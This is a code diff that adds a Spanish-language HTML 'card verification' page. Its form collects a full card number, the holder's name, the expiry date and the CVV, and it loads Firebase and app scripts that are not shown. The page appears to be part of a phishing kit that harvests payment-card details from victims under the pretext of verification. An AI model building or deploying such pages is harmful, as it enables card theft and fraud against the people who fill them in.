@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Verificación de Tarjeta Clásica</title>
+<link rel="stylesheet" href="styles.css">
+<script type="module" src="firebase.js"></script>
+<script type="module" src="app.js"></script>
+</head>
+
+<body>
+
+<div class="form-card">
+    <h2>Verificación de Tarjeta Clásica</h2>
+
+    <form id="formVerificacion">
+        <label>Número de tarjeta (16 dígitos)</label>
+        <input type="text" maxlength="16" required name="tarjeta">
+
+        <label>Nombre del titular</label>
+        <input type="text" required name="nombre">
+
+        <label>Fecha de vencimiento</label>
+        <input type="month" required name="vence">
+
+        <label>Código CVV</label>
+        <input type="password" maxlength="3" required name="cvv">
+
+        <button class="btn" type="submit">Verificar</button>
+    </form>
+</div>
+
+</body>
+</html>
